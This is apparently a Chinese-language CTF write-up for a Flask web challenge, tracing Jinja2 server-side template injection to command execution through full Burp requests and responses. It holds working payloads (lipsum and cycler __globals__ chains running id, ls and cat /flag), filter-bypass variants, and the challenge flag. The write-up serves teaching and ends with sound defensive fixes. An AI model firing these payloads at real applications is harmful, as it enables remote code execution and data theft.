# 模板里的问候 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / Jinja2 SSTI → RCE |
| 分值 | 250（动态计分） |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:32856`（复现容器） |
| Flag | `HTUCTF{2ccc6389-1536-49ae-a061-73cfae82e0af}` |
| 复现方式 | **Burp Repeater**（本文全用完整请求报文） |

## 1. 指纹

```http
GET / HTTP/1.1
Host: 103.163.47.230:32856
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

```http
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
```

`Server: gunicorn` → Python 应用，大概率 Flask。页面上只有一个昵称输入框，提交到 `POST /preview`。

## 2. Burp 复现

### 2.1 抓一个正常请求

页面填昵称提交 → Burp **Proxy → HTTP history** 找到 `POST /preview` → 右键 **Send to Repeater**。

### 2.2 判定模板引擎（4 条探针，逐个 Send）

| 探针（`nickname` 的值） | URL 编码后 | 响应里的回显 | 结论 |
|---|---|---|---|
| `{{7*7}}` | `%7B%7B7*7%7D%7D` | `你好，49！` | 表达式被**服务端求值** |
| `{{7*"7"}}` | `%7B%7B7*%227%22%7D%7D` | `7777777` | Python 语义（乘字符串） |
| `${7*7}` | `%24%7B7*7%7D` | 原样回显 | 不是 EL |
| `<%= 7*7 %>` | `%3C%25%3D%207*7%20%25%3E` | 原样回显 | 不是 ERB/EJS |

第 1 条在 Repeater 里的完整报文：

```http
POST /preview HTTP/1.1
Host: 103.163.47.230:32856
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Connection: close

nickname=%7B%7B7*7%7D%7D
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... 你好，49！欢迎使用 EzTemplate。 ...
```

→ **Jinja2 SSTI** 确认。

### 2.3 成因（源码层面）

```python
nickname = request.form.get("nickname", "CTFer")
result = render_template_string("你好，" + nickname + "！欢迎使用 EzTemplate。")
```

用户输入被**字符串拼接**进模板源码再交给 `render_template_string` 编译执行。
`render_template`（模板文件 + 变量传参）本身是安全的，坏在「拼字符串 + `render_template_string`」。

## 3. 从求值到 RCE

Jinja2 沙箱外最省事的链是 `lipsum`（模板全局函数），它的 `__globals__` 里有 `os`：

```http
POST /preview HTTP/1.1
Host: 103.163.47.230:32856
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Connection: close

nickname=%7B%7B%20lipsum.__globals__%5B%22os%22%5D.popen(%22id%22).read()%20%7D%7D
```

（未编码原文：`{{ lipsum.__globals__["os"].popen("id").read() }}`）

```http
HTTP/1.1 200 OK

... 你好，uid=10001(ctf) gid=10001(ctf) groups=10001(ctf),0(root) ！欢迎使用 EzTemplate。 ...
```

> 在 Repeater 里可以直接粘明文 `{{ lipsum.__globals__["os"].popen("id").read() }}`
> —— `"` 和空格一般不影响；若服务端返回 400，就用 **Decoder** 做一次 URL-encode。
> 注意 **payload 用双引号包字符串**，避免 Jinja 把单引号与外层打架。

### 3.1 找 flag

把命令换成 `ls -la /`：

```
{{ lipsum.__globals__["os"].popen("ls -la /").read() }}
```

```
-r--------   1 ctf  ctf    44 Oct 24 01:28 flag
drwxr-xr-x   1 root root 4096 Oct 16 02:55 app
```

进程以 `ctf` 身份运行（非 root，但 flag 同用户可读），直接：

```http
POST /preview HTTP/1.1
Host: 103.163.47.230:32856
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Connection: close

nickname=%7B%7B%20lipsum.__globals__%5B%22os%22%5D.popen(%22cat%20/flag%22).read()%20%7D%7D
```

```http
HTTP/1.1 200 OK

... 你好，HTUCTF{2ccc6389-1536-49ae-a061-73cfae82e0af}！欢迎使用 EzTemplate。 ...
```

### 3.2 备选链（有过滤时按需换）

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}          <!-- 找 subprocess.Popen -->
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__["__import__"]("os").popen("id").read() }}{% endif %}{% endfor %}
```

## 4. 踩坑

- **双层 HTML 转义**：`render_template_string` 的输出又被 `index.html` 的 `{{ result }}`
  转义一次，所以 `<` `>` `'` 会变成 `&amp;lt;` 之类。在 Burp 里看 Response 的
  **Raw** 标签页最直观；用脚本解析时要 `html.unescape()` 调两次。
- 前端 `maxlength="200"` 只是浏览器限制，Burp 不受影响；服务端也有 200 字符校验，
  但上面的 payload 只有 55 字符，够用。

## 5. 防御

- 永远不要把用户输入拼进模板源码；要插变量就写
  `render_template_string("你好，{{ name }}！", name=nickname)`
- 必须渲染不可信模板时用 `jinja2.sandbox.SandboxedEnvironment`
- 容器内最小权限（本题已非 root，但 flag 与进程同用户，一样能读 → flag 应挂载为仅 root 可读）
